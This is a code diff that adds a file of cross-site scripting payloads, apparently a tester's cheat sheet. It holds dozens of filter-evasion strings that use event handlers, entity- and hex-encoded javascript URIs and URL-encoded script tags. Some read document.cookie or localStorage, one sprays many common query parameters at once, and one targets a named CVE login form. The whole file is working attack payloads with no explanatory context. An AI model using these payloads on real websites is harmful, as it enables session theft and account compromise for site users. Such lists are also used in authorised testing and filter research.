@@ -1,0 +1,79 @@
+
+'">><div><meter onmouseover="alert(1)"</div>"
+
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+
+\');confirm(1);//
+
+<svg%0Aonauxclick=0;[1].some(confirm)//
+
+<svg onload=alert%26%230000000040"")>
+
+<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
+<svg onx=() onload=(confirm)(1)>
+
+<svg onx=() onload=(confirm)(document.cookie)>
+
+<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
+
+Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+
+"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+
+Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+
+"><onx=[] onmouseover=prompt(1)>
+
+%2sscript%2ualert()%2s/script%2u -xss popup
+
+<svg onload=alert%26%230000000040"1")>
+
+"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))
+
+[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)
+
+<svg onload=prompt%26%230000000040document.domain)>
+
+<svg onload=prompt%26%23x000000028;document.domain)>
+
+<svg/onrandom=random onload=confirm(1)>
+
+<video onnull=null onmouseover=confirm(1)>
+
+<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>
+
+:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+<img ignored=() src=x onerror=prompt(1)>
+
+ "><img src="/" =_=" title="onerror='prompt(document.cookie)'">
+
+ %0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+ javascript:alert(document.domain);&message=Not+Found&site_name=404
+
+ %3Cimg%20src=x%20data%27a%27onerror=alert%28domain%29%3E.childrenlist.html {AEM}
+
+ %22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+ <img src=x onerror=alert('XSS');>
+
+ %22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e.asp
+
+"><SVG ONLOAD=&#97&#108&#101&#114&#116(&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x64&#x6f&#x6d&#x61&#x69&#x6e)>.asp
+
+ %27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E
+
+ <img/src/onerror=prompt(8)>
+
+
+ \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
+
+ hack%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Bsubmit%5D=Change%20Password&login%5Buse_curr%5D=1
+
+ =%3Csvg/onload=alert(1)%3E
+
+ POST BASED CVE-2019-1010287
+"""username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login""" 
+
+%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
